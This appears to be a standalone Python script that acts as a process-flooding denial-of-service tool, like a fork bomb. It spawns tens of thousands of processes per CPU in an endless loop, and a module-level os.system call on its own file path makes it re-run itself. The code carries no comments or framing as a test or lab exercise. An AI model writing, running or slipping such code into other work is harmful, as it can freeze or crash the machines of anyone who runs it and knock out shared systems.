from multiprocessing import Process, cpu_count
import time
import os

def counter(number):
    while number > 0:
        number -= 1
        time.sleep(0.000001)

def spawn_processes(num_processes):
    processes = [Process(target=counter, args=(1000,)) for _ in range(num_processes)]

    for process in processes:
        process.start()
        print(f"Started process {process.pid}")

    for process in processes:
        process.join()
        print(f"Process {process.pid} has finished.")

def main():
    num_processors = cpu_count()

    num_processes = num_processors*20000

    print(f"Number of logicl processors: {num_processors}")
    print(f"Creating {num_processes} processes.")

    while True:
       spawn_processes(num_processes)

    spawn_processes(num_processes)

if __name__ == "__main__":
    main()

filepath = os.path.abspath(__file__)

os.system(filepath)